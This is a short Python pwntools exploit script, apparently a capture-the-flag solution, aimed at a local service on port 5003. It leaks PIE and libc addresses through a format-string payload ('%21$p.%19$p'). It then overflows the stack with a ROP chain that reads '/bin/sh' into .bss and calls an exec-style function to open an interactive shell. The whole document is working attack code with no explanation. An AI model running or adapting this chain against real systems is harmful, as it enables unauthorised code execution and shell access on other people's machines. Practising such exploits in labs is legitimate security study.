from pwn import *
#gcc -fno-stack-protector -Wno-format-security -pie -o task task.c

elf=ELF("./main",checksec=False)
libc=ELF("./libc.so.6",checksec=False)

rop = ROP(elf)

#p=process("./task_patched")
p=remote("localhost",5003)
pause()

offset=88


payload=b"%21$p.%19$p"

p.sendline(payload)

p.recvuntil("ahla b")

resp=p.recvline().strip().split(b".")

log.info(f"we have {resp}")


piebase=int(resp[0],16) - 4618

bss=p64(elf.bss()+piebase)

log.info(f"piebase = {hex(piebase)}")

libc.address=int(resp[1],16) - 172670




log.info(f"libc_base ={hex(libc.address)}")

#time for exploit

ret = 0x000000000000101a + piebase
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]+piebase
pop_rsi = rop.find_gadget(["pop rsi","ret"])[0]+piebase
pop_rdx = rop.find_gadget(["pop rdx","ret"])[0]+piebase

payload=cyclic(offset)

payload+=p64(ret)

payload+=p64(pop_rdi)

payload+=p64(0)

payload+=p64(pop_rsi)

payload+=bss

payload+=p64(pop_rdx)

payload+=p64(0x20)

payload+=p64(ret)

payload+=p64(elf.sym["read"]+piebase)

payload+=p64(ret)

payload+=p64(pop_rdi)

payload+=bss

payload+=p64(ret)

payload+=p64(elf.sym["execvi"]+piebase)



p.sendline(payload)

p.send("/bin/sh")




p.interactive()

